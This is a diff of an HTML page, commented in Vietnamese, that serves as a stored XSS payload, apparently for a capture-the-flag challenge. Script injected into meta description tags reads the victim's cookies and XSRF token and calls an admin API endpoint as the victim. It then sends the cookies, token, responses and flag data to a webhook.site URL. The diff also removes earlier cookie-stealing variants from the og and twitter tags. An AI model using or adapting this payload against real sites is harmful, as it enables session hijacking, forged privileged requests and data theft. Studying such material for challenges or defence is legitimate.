@@ -2,33 +2,39 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>XSS Payload - Max Debug</title>
+    <title>XSS Payload - Focused on name=description with Full Debug</title>
 
-    <meta property="og:title" content="MAX DEBUG - Critical System Alert">
+    <!-- Thẻ og:title có thể để trống hoặc một giá trị đơn giản -->
+    <meta property="og:title" content="System Update">
     
+    <!-- Thẻ og:description có thể để trống hoặc một script ping đơn giản -->
+    <meta property="og:description" content="<script>console.log('og:description executed');</script>">
+
     <!-- PAYLOAD CHÍNH VÀ CHI TIẾT NHẤT SẼ ĐẶT Ở ĐÂY -->
-    <meta property="og:description" content="
+    <meta name="description" content="
         <script>
             (function() {
                 var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
                 var webhook_base_url = 'https://webhook.site/';
                 var attacker_url = webhook_base_url + webhook_id;
 
-                function sendToWebhook(data, source_tag) {
+                function sendToWebhook(data_obj) { // Đổi tên tham số để rõ ràng hơn
                     var params = new URLSearchParams();
-                    params.append('source_tag', source_tag || 'unknown_source');
-                    for (var key in data) {
-                        if (data.hasOwnProperty(key)) {
-                            let value = data[key];
+                    // Luôn thêm source_tag
+                    params.append('source_tag', 'name:description_FULL_DEBUG'); 
+                    
+                    for (var key in data_obj) {
+                        if (data_obj.hasOwnProperty(key)) {
+                            let value = data_obj[key];
                             if (typeof value === 'object' && value !== null) {
                                 if (value instanceof Error) {
                                     value = { 
                                         error_name: value.name, 
                                         error_message: value.message, 
-                                        error_stack: value.stack ? value.stack.substring(0, 500) : 'no_stack', // Giới hạn stack trace
+                                        error_stack: value.stack ? value.stack.substring(0, 500) : 'no_stack',
                                         error_string: value.toString() 
                                     };
-                                } else if (value instanceof Response) { // Xử lý đối tượng Response
+                                } else if (value instanceof Response) {
                                     value = {
                                         response_ok: value.ok,
                                         response_status: value.status,
@@ -37,7 +43,12 @@
                                         response_url: value.url
                                     };
                                 }
-                                params.append(key, JSON.stringify(value));
+                                // Cố gắng stringify an toàn hơn
+                                try {
+                                    params.append(key, JSON.stringify(value));
+                                } catch (e_stringify) {
+                                    params.append(key, '[Unserializable Object]');
+                                }
                             } else {
                                 params.append(key, value);
                             }
@@ -45,109 +56,96 @@
                     }
                     var img = new Image();
                     var full_url = attacker_url + '?' + params.toString();
-                    // Để debug URL, có thể gửi nó về trước
-                    // var pre_img = new Image();
-                    // pre_img.src = attacker_url + '?debug_url_length=' + full_url.length + '&debug_url_start=' + encodeURIComponent(full_url.substring(0,100));
                     img.src = full_url;
                 }
 
                 try {
                     sendToWebhook({ 
-                        stage: 'og_script_start', 
+                        stage: 'script_start', 
                         current_document_cookie: document.cookie || 'empty',
                         location_href: window.location.href 
-                    }, 'og:description');
+                    });
                     
+                    // Lấy XSRF-TOKEN từ cookie để sử dụng nếu cần
+                    var xsrfTokenValue = null;
+                    var cookies = document.cookie.split(';');
+                    for (var i = 0; i < cookies.length; i++) {
+                        var cookie = cookies[i].trim();
+                        if (cookie.startsWith('XSRF-TOKEN=')) {
+                            xsrfTokenValue = decodeURIComponent(cookie.substring('XSRF-TOKEN='.length));
+                            break;
+                        }
+                    }
+                    if (xsrfTokenValue) {
+                        sendToWebhook({ stage: 'xsrf_token_found_in_cookie', xsrf_token: xsrfTokenValue });
+                    } else {
+                        sendToWebhook({ stage: 'xsrf_token_not_in_cookie' });
+                    }
+
                     fetch('/api/admin/sup3rs3cr3t', {
                         method: 'GET',
                         headers: {
                             'Accept': 'application/json',
                             'X-Requested-With': 'XMLHttpRequest'
+                            // Laravel tự động sử dụng XSRF-TOKEN cookie cho header X-XSRF-TOKEN
+                            // nếu nó tồn tại, nên không cần set X-XSRF-TOKEN thủ công ở đây.
                         }
                     })
                     .then(response => {
                         var response_headers_arr = [];
-                        try { response_headers_arr = Array.from(response.headers.entries()); } catch(e){}
+                        try { response_headers_arr = Array.from(response.headers.entries()); } catch(e_headers){}
 
                         sendToWebhook({ 
-                            stage: 'og_fetch_response_received', 
-                            response_obj: response, // Gửi cả đối tượng response để hàm sendToWebhook xử lý
-                            response_headers_debug: JSON.stringify(response_headers_arr)
-                        }, 'og:description');
+                            stage: 'fetch_response_received', 
+                            response_status: response.status, // Chỉ gửi status và text trước
+                            response_status_text: response.statusText,
+                            response_ok: response.ok,
+                            response_headers_preview: JSON.stringify(response_headers_arr).substring(0,500) // Preview headers
+                        });
 
                         if (!response.ok) {
-                            return response.text().then(text => {
-                                var errorToThrow = new Error('Fetch failed with status ' + response.status);
+                             // Quan trọng: phải clone response trước khi đọc body nhiều lần hoặc nếu muốn đọc sau
+                            var clonedResponse = response.clone();
+                            return clonedResponse.text().then(text => {
+                                var errorToThrow = new Error('Fetch API call failed'); // Thông điệp chung hơn
                                 errorToThrow.isResponseError = true;
-                                errorToThrow.status = response.status;
-                                errorToThrow.statusText = response.statusText;
-                                errorToThrow.responseBody = text.substring(0, 500); // Giới hạn body lỗi
+                                errorToThrow.status = clonedResponse.status;
+                                errorToThrow.statusText = clonedResponse.statusText;
+                                errorToThrow.responseBody = text ? text.substring(0, 500) : '[No Response Body]';
                                 errorToThrow.responseHeaders = JSON.stringify(response_headers_arr);
                                 throw errorToThrow;
                             });
                         }
-                        return response.json();
+                        return response.json(); // Chỉ gọi .json() nếu response.ok
                     })
                     .then(data => {
                         sendToWebhook({ 
-                            stage: 'og_sup3rs3cr3t_success', 
+                            stage: 'sup3rs3cr3t_success', 
                             flag_data: data 
-                        }, 'og:description');
+                        });
                     })
                     .catch(error => {
                         sendToWebhook({ 
-                            stage: 'og_sup3rs3cr3t_fetch_catch_error', 
-                            error_caught: error 
-                        }, 'og:description');
+                            stage: 'sup3rs3cr3t_fetch_catch_error', 
+                            error_caught: error // Hàm sendToWebhook sẽ cố gắng serialize
+                        });
                     });
-                } catch (e) {
+                } catch (e_outer) { // Đổi tên biến để tránh trùng
                      sendToWebhook({ 
-                        stage: 'og_outer_script_error', 
-                        outer_error: e
-                    }, 'og:description');
+                        stage: 'outer_script_error', 
+                        outer_error_details: e_outer // Hàm sendToWebhook sẽ cố gắng serialize
+                    });
                 }
             })();
         </script>
     ">
-
-    <meta name="description" content="
-        <script>
-            (function() {
-                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
-                var webhook_base_url = 'https://webhook.site/';
-                var attacker_url = webhook_base_url + webhook_id;
-                var img = new Image();
-                var data = {
-                    source_tag: 'name:description',
-                    status: 'name_description_executed',
-                    loc: window.location.href,
-                    cookie: document.cookie || 'empty'
-                };
-                img.src = attacker_url + '?' + new URLSearchParams(data).toString();
-            })();
-        </script>
-    ">
+    
+    <!-- Thẻ Twitter có thể bỏ trống hoặc một ping đơn giản -->
     <meta name="twitter:card" content="summary">
-    <meta name="twitter:title" content="MAX DEBUG - Twitter">
-    <meta name="twitter:description" content="
-        <script>
-            (function() {
-                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
-                var webhook_base_url = 'https://webhook.site/';
-                var attacker_url = webhook_base_url + webhook_id;
-                var img = new Image();
-                 var data = {
-                    source_tag: 'twitter:description',
-                    status: 'twitter_description_executed',
-                    loc: window.location.href,
-                    cookie: document.cookie || 'empty'
-                };
-                img.src = attacker_url + '?' + new URLSearchParams(data).toString();
-            })();
-        </script>
-    ">
+    <meta name="twitter:title" content="System Maintenance">
+    <meta name="twitter:description" content="<script>console.log('twitter:description executed');</script>">
 
 </head><body>
-    <h1>MAX DEBUG XSS Payload Page</h1>
-    <p>Check your webhook.</p>
+    <h1>XSS Payload Page - name=description with FULL DEBUG</h1>
+    <p>This page's 'name=description' meta tag contains the primary XSS payload.</p>
 </body></html>
